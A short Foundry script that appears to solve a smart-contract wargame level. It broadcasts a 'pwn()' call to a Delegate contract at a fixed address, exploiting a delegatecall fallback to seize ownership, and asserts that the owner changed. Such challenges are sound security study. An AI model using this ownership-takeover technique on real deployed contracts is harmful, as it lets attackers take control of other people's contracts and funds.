// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";

import "../src/Delegate.sol";

contract deployDelegateCall is Script {

  function run() external {

  address delegateCallAddress = 0xe689Bb6BCb751D252CD86173a954928b2F40588F;

  Delegate delegateCall = Delegate(delegateCallAddress);

  uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");

  vm.startBroadcast(deployerPrivateKey);

  bytes memory data = abi.encodeWithSignature("pwn()");

  (bool success, ) = address(delegateCall).call(data);
  require(success, "call failed");

  assert(delegateCall.owner() == address(0x8b88A3b92433638324E5f429bEe52b1fd84E7c5a));

  vm.stopBroadcast();

  }

}